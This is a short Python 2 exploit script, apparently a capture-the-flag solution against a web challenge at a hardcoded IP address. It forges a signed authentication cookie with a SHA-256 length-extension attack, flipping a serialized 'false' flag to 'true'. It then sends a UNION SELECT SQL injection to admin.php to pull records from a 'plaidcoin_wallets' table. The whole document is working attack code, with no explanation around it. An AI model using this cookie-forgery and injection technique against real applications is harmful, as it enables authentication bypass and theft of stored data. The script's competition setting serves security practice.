#!/usr/bin/env python
import requests 
from urllib import quote_plus as urlencode
from pysha256 import sha256

HOST = "54.211.6.40"

r = requests.get("http://"+HOST+"/admin.php")

orig_val = r.cookies['auth']

prefix_len = 8
orig_val = "b:0;"[::-1]
new_thing = "b:1;"[::-1]

#THANKS EINDBAZEN
h = sha256()
orig_hash = r.cookies['hsh']
split_hash = map(lambda x: int(x,16),[orig_hash[x:x+8] for x in range(0,len(orig_hash),8)])

h = sha256()
h._h = split_hash[:]
h.update(new_thing)
new_val = orig_val + '\x80'
new_val += '\x00' * (64-(prefix_len)-len(orig_val)-2)
padlen = (prefix_len + len(orig_val)) * 8
new_val += chr(padlen)
new_val += new_thing

fake_len=(len(new_val) + prefix_len) * 8
fake = h.hexdigest(fake_len).lower()

cookies = {'auth':urlencode(new_val[::-1]), 'hsh':fake}
r = requests.get("http://"+HOST+"/admin.php?query=1%20union%20select%20id%20from%20plaidcoin_wallets",cookies=cookies)
print r.text
